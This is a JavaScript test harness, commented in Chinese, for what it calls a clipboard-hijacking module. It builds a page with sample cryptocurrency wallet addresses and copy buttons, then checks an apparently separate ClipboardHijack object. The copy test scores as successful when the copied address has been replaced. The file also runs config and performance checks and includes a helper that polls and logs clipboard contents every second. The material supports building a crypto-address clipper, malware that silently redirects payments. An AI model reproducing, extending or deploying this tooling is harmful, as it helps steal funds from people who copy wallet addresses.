/**
 * 剪贴板劫持测试工具包
 * 用于验证各功能模块的效果
 */

const TestToolkit = {
  // 生成测试页面
  createTestPage() {
    document.body.innerHTML = `
      <div style="max-width: 800px; margin: 40px auto; font-family: -apple-system, sans-serif;">
        <h1>剪贴板劫持测试页面</h1>
        
        <h2>测试地址</h2>
        <div class="test-addresses" style="background: #f5f5f5; padding: 20px; border-radius: 8px;">
          <p>BTC: <code id="btc-addr">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code></p>
          <p>ETH: <code id="eth-addr">0x742d35Cc6634C0532925a3b844Bc9e7595f2bd20</code></p>
          <p>USDT: <code id="usdt-addr">TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6</code></p>
        </div>
        
        <h2>测试场景</h2>
        
        <h3>1. 复制按钮测试</h3>
        <button class="copy-btn" data-address="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh">
          📋 复制BTC地址
        </button>
        <button class="copy-address" data-clipboard-text="0x742d35Cc6634C0532925a3b844Bc9e7595f2bd20">
          📋 复制ETH地址
        </button>
        
        <h3>2. 输入框测试</h3>
        <input type="text" placeholder="粘贴地址到这里" style="width: 100%; padding: 10px;">
        <textarea placeholder="或者粘贴到这里" style="width: 100%; height: 60px; padding: 10px;"></textarea>
        
        <h3>3. 选择文本测试</h3>
        <div style="background: #fff3cd; padding: 15px; border-radius: 4px;">
          请尝试选择这个地址: 0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe
        </div>
        
        <h3>4. 分享测试</h3>
        <button id="share-test">📤 分享地址</button>
        
        <h2>测试结果</h2>
        <div id="test-results" style="background: #d4edda; padding: 20px; border-radius: 8px; min-height: 200px;">
          <p>等待测试...</p>
        </div>
      </div>
    `;
    
    // 绑定分享按钮
    document.getElementById('share-test').onclick = () => {
      if (navigator.share) {
        navigator.share({
          title: '钱包地址',
          text: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
        });
      } else {
        alert('当前浏览器不支持分享API');
      }
    };
    
    // 绑定复制按钮
    document.querySelectorAll('.copy-btn, .copy-address').forEach(btn => {
      btn.onclick = () => {
        const addr = btn.dataset.address || btn.dataset.clipboardText;
        navigator.clipboard.writeText(addr).then(() => {
          alert('地址已复制到剪贴板！');
        });
      };
    });
  },
  
  // 运行测试套件
  async runTests() {
    const results = [];
    const log = (test, success, details = {}) => {
      results.push({ test, success, details, timestamp: Date.now() });
      this.updateResults(results);
    };
    
    // 测试1：检测平台
    const platform = window.ClipboardHijack.platform.detect();
    log('平台检测', true, platform);
    
    // 测试2：复制事件
    try {
      const testText = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh';
      await navigator.clipboard.writeText(testText);
      const result = await navigator.clipboard.readText();
      log('复制劫持', result !== testText, { original: testText, result });
    } catch (e) {
      log('复制劫持', false, { error: e.message });
    }
    
    // 测试3：配置切换
    const stats1 = window.ClipboardHijack.stats();
    window.ClipboardHijack.controller.setConfig({ 
      global: { testMode: true } 
    });
    const stats2 = window.ClipboardHijack.stats();
    log('配置管理', stats2.config.global.testMode === true, { before: stats1, after: stats2 });
    
    // 测试4：性能测试
    const startTime = performance.now();
    for (let i = 0; i < 100; i++) {
      document.dispatchEvent(new Event('selectionchange'));
    }
    const duration = performance.now() - startTime;
    log('性能测试', duration < 1000, { duration: duration + 'ms', operations: 100 });
    
    return results;
  },
  
  // 更新测试结果显示
  updateResults(results) {
    const container = document.getElementById('test-results');
    if (!container) return;
    
    container.innerHTML = results.map(r => `
      <div style="margin: 10px 0; padding: 10px; background: ${r.success ? '#d4edda' : '#f8d7da'}; border-radius: 4px;">
        <strong>${r.success ? '✅' : '❌'} ${r.test}</strong>
        <pre style="margin: 5px 0; font-size: 12px;">${JSON.stringify(r.details, null, 2)}</pre>
      </div>
    `).join('');
  },
  
  // 监控剪贴板变化
  async monitorClipboard() {
    console.log('📋 开始监控剪贴板...');
    
    let lastContent = '';
    setInterval(async () => {
      try {
        const content = await navigator.clipboard.readText();
        if (content !== lastContent) {
          console.log('📋 剪贴板变化:', {
            prev: lastContent,
            current: content,
            timestamp: new Date().toISOString()
          });
          lastContent = content;
        }
      } catch (e) {
        // 需要用户交互
      }
    }, 1000);
  }
};
